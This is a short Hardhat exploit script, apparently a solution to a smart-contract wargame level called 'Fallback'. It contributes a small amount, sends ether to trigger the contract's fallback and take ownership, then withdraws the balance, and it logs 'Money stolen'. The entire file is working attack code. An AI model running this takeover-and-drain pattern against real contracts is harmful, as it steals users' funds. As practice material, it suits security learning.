const { ethers } = require("hardhat");
const hre = require("hardhat");
require("dotenv").config();

async function main() {
  const rpc = new ethers.providers.JsonRpcProvider(process.env.ALCHEMY_URL);
  const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, rpc);
  const contractAdress = "0xAf5a67D7E3f3084efd88d5F612D5A45B5853E893";
  const Fallback = await hre.ethers.getContractAt(
    "Fallback",
    contractAdress,
    wallet
  );

  const contribute = await Fallback.contribute({
    value: ethers.utils.parseEther("0.0009"),
  });
  console.log("Contribute called", contribute.hash);
  const send = await wallet.sendTransaction({
    to: Fallback.address,
    value: ethers.utils.parseEther("1"),
  });

  console.log("Ether has been sent", send.hash);
  const withdraw = await Fallback.withdraw();
  console.log("withdrew ETH", withdraw.hash);

  console.log("Operation successfull, target hacked! Money stolen !");
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
